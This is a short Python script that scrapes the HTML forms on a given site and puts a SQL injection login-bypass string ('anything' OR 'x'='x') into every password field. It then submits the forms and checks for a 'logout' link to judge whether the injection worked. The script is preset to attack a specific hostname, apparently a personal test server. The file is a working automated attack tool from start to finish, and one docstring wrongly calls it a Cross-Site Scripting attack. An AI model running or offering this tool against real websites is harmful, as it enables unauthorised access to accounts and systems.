import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup


def get_forms(target_url):
    """
    Function requests all website HTML forms
    :param target_url: Requested URL
    :return: Returns all forms from HTML content
    """
    # Extract HTML source code of target website
    soup = BeautifulSoup(requests.get(target_url).content, 'html.parser')
    # Find all "form" elements and return result
    return soup.find_all('form')


def get_form_attributes(form):
    """
    Function extracts all attributes of HTML form
    :param form: HTML form
    :return: All attributes and values of HTML form
    """
    # Define form attributes array
    form_attributes = {}
    # Get the form action attribute
    action = form.attrs.get('action')
    # Get the form method attribute
    method = form.attrs.get('method')
    # Define form input attributes and values list
    form_inputs = []
    # Iterate over all form elements (input, button) and add attributes to list
    for form_input in form.find_all(['input', 'button']):
        form_input_type = form_input.attrs.get('type')
        form_input_name = form_input.attrs.get('name')
        form_inputs.append({'type': form_input_type, 'name': form_input_name})
    # Add all attributes and values to array
    form_attributes['action'] = action
    form_attributes['method'] = method
    form_attributes['inputs'] = form_inputs
    return form_attributes


def submit_form(form_attributes, target_url, sql_string):
    """
    Function prepares form data and submits form
    :param form_attributes: Form input attributes with values
    :param target_url: Requested URL
    :param sql_string: partial SQL request
    "return: HTTP Response after form submission
    """
    # Construct form submission URL
    submit_url = urljoin(target_url, form_attributes['action'])
    # Get the form inputs
    form_inputs = form_attributes['inputs']
    # Define form data array
    form_data = {}
    # Iterate over all form elements and add them values
    for form_input in form_inputs:
        # Detect login forms by password type inputs
        if form_input['type'] == 'password' or form_input['type'] == 'submit':
            # Fills partial SQL String into password type input
            if form_input['type'] == 'password':
                form_input['value'] = sql_string
            else:
                # Fill submit input
                form_input['value'] = 'login'
        # Sends a POST request if method is post and return response
        form_input_name = form_input.get('name')
        form_input_value = form_input.get('value')
        if form_input_name and form_input_value:
            # Add values to the data of form submission
            form_data[form_input_name] = form_input_value
    if form_attributes['method'] == 'post':
        # Sends a POST request if method is post and return response
        return requests.post(submit_url, data=form_data)
    else:
        # Sends a GET request if method is get and return response
        return requests.get(submit_url, params=form_data)


def run_sqli(target_url, sql_string):
    """
    Function performs Cross-Site Scripting attack
    :param sql_string: partial SQL request
    :param target_url: Target URL
    :return: Attack success
    """
    is_success = 0
    forms = get_forms(target_url)
    # Iterate over all forms
    for form in forms:
        # Get form attributes
        form_attributes = get_form_attributes(form)
        # Submit form and save HTTP response
        content = submit_form(form_attributes, target_url, sql_string).content.decode()
        # Search through website content
        if 'logout' in content:
            # Logout is visible only for logged in users
            is_success += 1
    if is_success > 0:
        #
        print('SQL injection was successful')
    else:
        print('SQL injection was unsuccessful')


if __name__ == '__main__':
    url = 'http://apache1.willilazarov.cz/'
    sqlString = 'anything\' OR \'x\'=\'x'
    run_sqli(url, sqlString)
